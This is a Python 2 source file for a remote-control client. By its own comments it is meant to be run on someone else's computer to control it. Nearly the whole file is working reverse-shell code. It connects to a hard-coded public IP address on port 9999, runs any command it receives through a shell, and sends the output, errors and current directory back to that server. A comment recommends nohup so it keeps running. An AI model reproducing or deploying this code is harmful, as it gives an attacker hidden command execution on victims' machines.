#!/usr/bin/python

# Hackers would put on cd and run and connects to server

# Once running, connect to server, just wait for instructions
# Run commands, scripts and send back output to server
# So controlling someone else's computer

# For running script, use nohup at beginning 

import os  
import subprocess
import socket
import struct
import json
from subprocess import check_output

# To get home directory
from os.path import expanduser

def connectToServer():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Create a socket object
	host = '54.202.173.225' # Put in instance server's IPv4 Public IP - 54.202.173.225, localhost
	port = 9999                # Port of server
	print "Trying to connect to: {} at {}".format(host, port)
	s.connect((host,port))

	# Keep listening for instructions as terminal commands
	while True: 
		print "Waiting for command..."
		data = s.recv(1024)	# Receive command from server
		print "raw data from server: {}".format(data)
		data = json.loads(data)
		print "jsonloads data is: {}".format(data)
		# Extract commands into separate words
		commandsWords = data.split()
		
		# Other data to send back to client
		exception = ""
		commandOutput = ""
		
		# Initially, when asked will send current working directory to server
		if data == "getCurrentPath":
			currentDir = os.getcwd()
			print "Sending working directory: {}".format(currentDir)
			send_msg(s, currentDir)
			continue

		# Handle case of changing directories
		elif commandsWords[0] == "cd":
			try:
				if commandsWords[1] == "~": # Go to ~ (root) folder
					home = expanduser("~")
					os.chdir(home)
				elif commandsWords[1][0] == "~": # Go to ~/somehting folder
					home = expanduser("~")
					os.chdir(home)
					nextDir = commandsWords[1][2:]
					os.chdir(nextDir)
				else:
					os.chdir(commandsWords[1])
			except Exception as e:
				print "Exception is: {}".format(e)
				exception = e

		# Other commands like ls, python --version etc
		else:			
			try:		
				# Todo: Find better way to get output of script rather than just saying "tried running script"
				# Todo: Handle cases of '&' at end or not to run script in background
				# Todo: IMP - Right now, scripts can be run with "nohup" command

				# Pipes any output to standard stream				
				cmd = subprocess.Popen(data, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
				
				# Check if script or not
				lastArg = commandsWords[len(commandsWords) - 1]
				# check if last arg is .sh so script, so just return string saying ran script
				if lastArg[-3:] == ".sh":	
					print "Its a script"
					commandOutput = "Tried running the script."
				else: # Not script, so return output from running command
					print "Not a script"
					commandOutput = cmd.stdout.read() + cmd.stderr.read()
					print "commandOutput is: \n{}".format(commandOutput)

			except Exception as e:
				print "exception is: {}".format(e)
				exception = e

		# Get new current directory regardless of changed or not
		newDir = os.getcwd()
		
		# Formatting data to send to client
		sendBack = {}
		sendBack["currentDir"] = newDir
		sendBack["exception"] = str(exception)
		sendBack["commandOutput"] = str(commandOutput)
		
		#print "raw sendBack is: \n{}".format(sendBack)
		sendBackFormatted = json.dumps(sendBack) #data serialized
		#print "sendBackFormatted is: \n{}".format(sendBackFormatted)
		
		#s.sendall(sendBackFormatted)
		send_msg(s, sendBackFormatted)
		
	s.close # Close the socket when done

#------------------------------------------------------------------------------

# This helper function needed to send and receive longer messages.
# From http://stackoverflow.com/questions/17667903/python-socket-receive-large-amount-of-data
def send_msg(sock, msg):
    # Prefix each message with a 4-byte length (network byte order)
    msg = struct.pack('>I', len(msg)) + msg
    sock.sendall(msg)

#------------------------------------------------------------------------------

# To start up program, using: python client.py
if __name__ == "__main__":
	connectToServer()